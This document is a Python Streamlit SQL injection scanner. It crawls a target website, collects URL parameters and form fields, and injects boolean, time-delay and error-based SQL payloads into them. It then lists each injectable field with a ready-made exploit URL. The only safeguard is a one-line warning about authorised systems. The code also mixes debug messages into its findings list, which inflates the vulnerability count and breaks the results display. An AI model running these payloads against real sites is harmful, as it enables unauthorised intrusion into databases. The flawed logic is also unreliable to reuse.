import streamlit as st
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from bs4 import BeautifulSoup
from collections import deque

class SQLiScanner:
    def __init__(self, target_url, timeout=10, max_pages=20):
        self.target_url = target_url
        self.timeout = timeout
        self.max_pages = max_pages
        self.session = requests.Session()
        self.vulnerable = False
        self.results = []
        self.debug = True
        self.visited = set()
        self.queue = deque()

        # Payloads
        self.boolean_payloads = ["' OR '1'='1", "' AND '1'='2"]
        self.time_payload = "' OR (SELECT SLEEP(5))--"
        self.error_payload = "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--"

    def log_debug(self, message):
        """Log debug messages."""
        if self.debug:
            self.results.append(f"[DEBUG] {message}")

    def normalize_url(self, url):
        """Normalize URL to avoid duplicates."""
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    def crawl(self):
        """Crawl the website starting from the target URL."""
        self.queue.append(self.target_url)
        self.visited.add(self.normalize_url(self.target_url))

        while self.queue and len(self.visited) < self.max_pages:
            current_url = self.queue.popleft()
            try:
                response = self.session.get(current_url, timeout=self.timeout)
                soup = BeautifulSoup(response.text, 'html.parser')

                # Extract all links
                for link in soup.find_all('a', href=True):
                    url = urljoin(current_url, link['href'])
                    normalized = self.normalize_url(url)
                    if normalized not in self.visited and urlparse(url).netloc == urlparse(self.target_url).netloc:
                        self.visited.add(normalized)
                        self.queue.append(url)
                        self.log_debug(f"Discovered new page: {url}")

            except Exception as e:
                self.log_debug(f"Crawl error for {current_url}: {e}")

    def scrape_inputs(self, url):
        """Scrape GET params and POST forms from a URL."""
        inputs = []

        # 1. GET parameters
        parsed = urlparse(url)
        get_params = list(parse_qs(parsed.query).keys())
        if get_params:
            inputs.append({
                'action': url,
                'method': 'get',
                'inputs': get_params
            })

        # 2. POST forms
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                action = form.get('action')
                method = form.get('method', 'get').lower()
                input_tags = form.find_all('input')
                input_names = [tag.get('name') for tag in input_tags if tag.get('name')]

                if input_names:
                    inputs.append({
                        'action': urljoin(url, action),
                        'method': method,
                        'inputs': input_names
                    })
        except Exception as e:
            self.log_debug(f"Form scrape error for {url}: {e}")

        return inputs

    def test_input(self, input_dict):
        """Test a single input for SQLi."""
        action = input_dict['action']
        method = input_dict['method']

        for field in input_dict['inputs']:
            # Boolean-based
            try:
                data_true = {field: self.boolean_payloads[0]}
                data_false = {field: self.boolean_payloads[1]}

                if method == 'get':
                    resp_true = self.session.get(action, params=data_true, timeout=self.timeout)
                    resp_false = self.session.get(action, params=data_false, timeout=self.timeout)
                else:
                    resp_true = self.session.post(action, data=data_true, timeout=self.timeout)
                    resp_false = self.session.post(action, data=data_false, timeout=self.timeout)

                # Compare DOM structure
                soup_true = BeautifulSoup(resp_true.text, 'html.parser')
                soup_false = BeautifulSoup(resp_false.text, 'html.parser')
                diff = len(soup_true.find_all()) != len(soup_false.find_all())

                if diff:
                    self.vulnerable = True
                    self.results.append({
                        'input': field,
                        'type': 'Boolean-based',
                        'payload': self.boolean_payloads[0],
                        'proof': 'DOM structure changed.',
                        'url': self.build_example_url(action, field, self.boolean_payloads[0], method)
                    })
            except Exception as e:
                self.log_debug(f"Boolean test error for {field}: {e}")

            # Time-based
            try:
                start = time.time()
                if method == 'get':
                    self.session.get(action, params={field: self.time_payload}, timeout=self.timeout)
                else:
                    self.session.post(action, data={field: self.time_payload}, timeout=self.timeout)
                elapsed = time.time() - start

                if elapsed >= 5:
                    self.vulnerable = True
                    self.results.append({
                        'input': field,
                        'type': 'Time-based',
                        'payload': self.time_payload,
                        'proof': f'Delay: {elapsed:.2f}s',
                        'url': self.build_example_url(action, field, self.time_payload, method)
                    })
            except Exception as e:
                self.log_debug(f"Time test error for {field}: {e}")

            # Error-based
            try:
                if method == 'get':
                    resp = self.session.get(action, params={field: self.error_payload}, timeout=self.timeout)
                else:
                    resp = self.session.post(action, data={field: self.error_payload}, timeout=self.timeout)

                error_keywords = ['sql', 'syntax', 'conversion failed', 'mysql', 'pgsql', 'odbc']
                if any(k in resp.text.lower() for k in error_keywords):
                    self.vulnerable = True
                    self.results.append({
                        'input': field,
                        'type': 'Error-based',
                        'payload': self.error_payload,
                        'proof': 'Database error detected.',
                        'url': self.build_example_url(action, field, self.error_payload, method)
                    })
            except Exception as e:
                self.log_debug(f"Error test error for {field}: {e}")

    def build_example_url(self, action, field, payload, method):
        """Build an example exploit URL."""
        if method == 'get':
            parsed = urlparse(action)
            query = parse_qs(parsed.query)
            query[field] = payload
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(query, doseq=True)}"
        else:
            return f"POST to {action} with {field}={payload}"

    def scan(self):
        """Crawl and test all pages."""
        self.crawl()
        for url in self.visited:
            inputs = self.scrape_inputs(url)
            for input_dict in inputs:
                self.test_input(input_dict)

def main():
    st.set_page_config(page_title="Website SQLi Scanner", layout="wide")
    st.title("🕵️‍♂️ Website SQL Injection Scanner")
    st.warning("⚠️ Only test on authorized systems.")

    target_url = st.text_input("Enter target URL (e.g., https://example.com):", "")
    if target_url and st.button("Start Full Scan"):
        scanner = SQLiScanner(target_url)
        with st.spinner("Crawling website and testing for SQLi..."):
            scanner.scan()

        st.subheader("🔎 Results")
        if scanner.vulnerable:
            st.success(f"Vulnerabilities found: {len(scanner.results)}")
            for res in scanner.results:
                st.markdown(
                    f"**Input:** `{res['input']}`  \n"
                    f"**Type:** `{res['type']}`  \n"
                    f"**Payload:** `{res['payload']}`  \n"
                    f"**Proof:** {res['proof']}  \n"
                    f"**Example:** {res['url']}"
                )
        else:
            st.error("No vulnerabilities detected.")

        # Debug logs
        if scanner.debug:
            st.subheader("📜 Debug Logs")
            for log in scanner.results:
                if isinstance(log, str) and log.startswith("[DEBUG]"):
                    st.code(log)

if __name__ == "__main__":
    main()
